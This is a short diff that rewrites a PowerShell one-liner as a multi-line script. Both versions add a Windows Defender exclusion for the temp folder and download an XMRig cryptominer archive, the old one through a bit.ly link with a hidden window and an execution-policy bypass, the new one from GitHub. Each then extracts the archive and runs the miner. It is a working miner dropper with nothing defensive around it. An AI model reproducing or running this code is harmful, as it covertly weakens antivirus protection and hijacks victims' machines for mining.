@@ -1,1 +1,5 @@
-powershell -w h Add-MpPreference -ExclusionPath "$env:tmp"; -NoP -Ep Bypass $D="$env:tmp";irm -Uri 'bit.ly/3NMVwfq' -O "$D\xmrig.zip";Expand-Archive "$D\xmrig.zip" -Des $D -F;. "$D\xmrig\xmrig.exe"
+Add-MpPreference -ExclusionPath "$env:temp"
+$D = "$env:temp"
+Invoke-WebRequest -Uri 'https://github.com/Peekaboo-ICU/XMRig/archive/refs/heads/main.zip' -OutFile "$D\Xmrig-main.zip"
+Expand-Archive -Path "$D\Xmrig-main.zip" -DestinationPath $D -Force
+& "$D\xmrig-main\xmrig.exe"
